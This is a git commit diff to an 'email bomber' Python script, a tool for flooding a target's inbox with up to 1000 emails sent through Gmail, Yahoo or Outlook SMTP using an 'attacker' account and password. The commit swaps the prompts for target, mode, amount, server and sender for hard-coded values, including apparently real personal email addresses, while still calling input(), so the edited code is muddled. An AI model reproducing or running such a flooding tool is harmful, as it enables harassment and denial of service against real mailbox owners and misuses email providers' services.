f5900e5cdeb9fe174de7548238a80dcc71685145
You5uf233 <yousuf.habibzai@gmail.com>
2025-06-16 09:03:29 -0700

    Update email_bomber_v2.0.py

--- email_bomber_v2.0.py
+++ email_bomber_v2.0.py
@@ -50,8 +50,8 @@ class EmailBomber:
         self.y = bColors.YELLOW
         try:
             print(self.b + '\n[+] Initializing bomber ...')
-            self.target = str(input(self.g + '[:] Enter Target Email > '))
-            self.mode = int(input(self.g + '[:] Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) > '))
+            self.target = str(input(self.g + '[:] Yousuf.habibzai@gmail.com > '))
+            self.mode = int(input(self.g + '[:] 4 || 1:(1000) 2:(500) 3:(250) 4:(custom) > '))
 
             if int(self.mode) > int(4) or int(self.mode) < int(1):
                 print(self.r + '[-] ERROR: Invalid Option!')
@@ -72,7 +72,7 @@ class EmailBomber:
             elif self.mode == int(3):
                 self.amount = int(250)
             else:
-                self.amount = int(input(self.g + '[:] Choose a CUSTOM amount > '))
+                self.amount = int(input(self.g + '[:] 10 > '))
             print(self.g + f'[+] You have selected BOMB mode {self.mode} and {self.amount} emails')
 
         except Exception as e:
@@ -82,8 +82,7 @@ class EmailBomber:
     def email(self):
         try:
             print(self.b + '\n[+] Setting up email ...')
-            self.server = str(input(self.g + '[:] Enter email server | or select premade options - 1:Gmail 2:Yahoo '
-                                             '3:Outlook 4:Custom > '))
+            self.server = str(input(self.g + '[:] 1 > '))
             defaultPort = True
 
             if self.server == '4':
@@ -100,7 +99,7 @@ class EmailBomber:
             elif self.server == '3':
                 self.server = 'smtp-mail.outlook.com'
 
-            self.fromAddr = str(input(self.g + '[:] Enter attacker email address > '))
+            self.fromAddr = str(input(self.g + '[:] haveagoodday@gmail.com > '))
             self.fromPwd = str(input(self.g + '[:] Enter attacker password > '))
             self.subject = str(input(self.g + '[:] Enter subject > '))
             self.message = str(input(self.g + '[:] Enter message > '))
